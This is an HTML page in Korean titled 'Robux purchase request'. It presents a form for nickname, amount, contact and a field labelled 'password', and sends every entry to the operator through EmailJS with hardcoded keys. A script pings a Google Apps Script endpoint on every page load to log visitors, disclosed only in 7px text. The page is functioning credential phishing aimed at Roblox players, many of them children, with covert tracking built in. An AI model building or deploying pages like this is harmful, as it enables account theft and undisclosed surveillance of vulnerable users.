<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <title>로벅스 구매 요청</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("0zYUbiKWqyCZGh9jB");
    })();
  </script>

  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(135deg, #e0f7fa, #f1f8e9);
      padding: 40px;
    }
    .container {
      max-width: 420px;
      margin: auto;
      background: #ffffff;
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      font-weight: 600;
    }
    label {
      font-size: 13px;
      margin-top: 15px;
      display: block;
      color: #555;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid #ddd;
    }
    textarea {
      height: 100px;
      resize: none;
    }
    button {
      width: 100%;
      margin-top: 25px;
      padding: 14px;
      background: linear-gradient(135deg, #4CAF50, #43a047);
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>

<body>

<div class="container">
  <h2>로벅스 구매 요청</h2>

  <label>닉네임</label>
  <input id="nickname" required />

  <label>로벅스 양</label>
  <input id="amount" required />

  <label>연락처</label>
  <input id="contact" required />

  <label>비밀번호</label>
  <textarea id="request" required></textarea>

  <button onclick="sendEmail()">요청 보내기</button>
</div>

<p style="font-size:7px;color:#666;text-align:center;">
본 사이트는 서비스 운영 및 보안 목적을 위해 IP, 국가, 통신사 정보를 수집할 수 있습니다.
</p>

<!-- 방문자 수집 (여기가 정답 위치) -->
<script>
fetch("https://script.google.com/macros/s/AKfycbxMqdrRKFKFGXw87IANDIiiLwXyanLe38uVcfU3xX8JwtKYRpnlgTBVIUYuxSN-6Sby/exec", {
  mode: "no-cors"
});
</script>

<script>
function sendEmail() {
  const params = {
    nickname: nickname.value,
    amount: amount.value,
    contact: contact.value,
    request: request.value
  };

  if (Object.values(params).some(v => !v)) {
    alert("모든 항목을 입력해주세요.");
    return;
  }

  emailjs.send("service_2osfyze", "template_60av7xp", params)
    .then(() => alert("요청이 전송되었습니다!"))
    .catch(err => alert("전송 실패"));
}
</script>

</body>
</html>
